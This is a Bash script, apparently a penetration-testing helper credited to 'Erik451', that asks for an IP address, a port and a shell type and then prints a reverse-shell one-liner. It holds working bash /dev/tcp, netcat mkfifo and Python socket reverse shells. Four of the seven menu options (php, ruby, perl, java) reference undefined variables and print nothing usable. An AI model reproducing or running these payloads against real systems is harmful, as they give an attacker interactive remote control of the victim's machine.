#!/bin/bash
#colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Funcion ctrl + c
trap ctrl_c INT
function ctrl_c(){
    echo -e "\n${yellowColour}[]${endColour}${grayColour}Saliendo${endColour}"
    exit 0
}

#Banner
echo -e "${redColour}    ____                                   _____ __         ____"
        sleep 0.05
        echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /____"
        sleep 0.05
        echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / / ___/"
        sleep 0.05
        echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / (__  ) "
        sleep 0.05
        echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/____/  ${endColour}"
        echo -e "\n ${yellowColour} By Erik451 ${endColour}"

#Tipos de shell
echo -e "\n ${purpleColour} Tipos de shell disponibles: ${endColour}"

echo -e "\n 1) bash     5) ruby"
echo -e "\n 2) netcat   6) perl"
echo -e "\n 3) php      7) java"
echo -e "\n 4) python"

#Pregunta por el tipo de shell
echo -e "\n${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce el tipo de shell: ${endColour}"; read shell
echo -e "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce tu ip: ${endColour}"; read ip
echo -e "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce el puerto: ${endColour}"; read port

#VARIABLES
bash="bash -i >& /dev/tcp/$ip/$port 0>&1"
netcat="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
#Respuerta tipo de shell
case $shell in

    1)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $bash"
         ;;
    2)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $netcat"
         ;;
    3)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $php"
         ;;
    4)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $python"
         ;;
    5)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $ruby"
         ;;
    6)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $perl"
         ;;
    7)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $java"
         ;;

esac
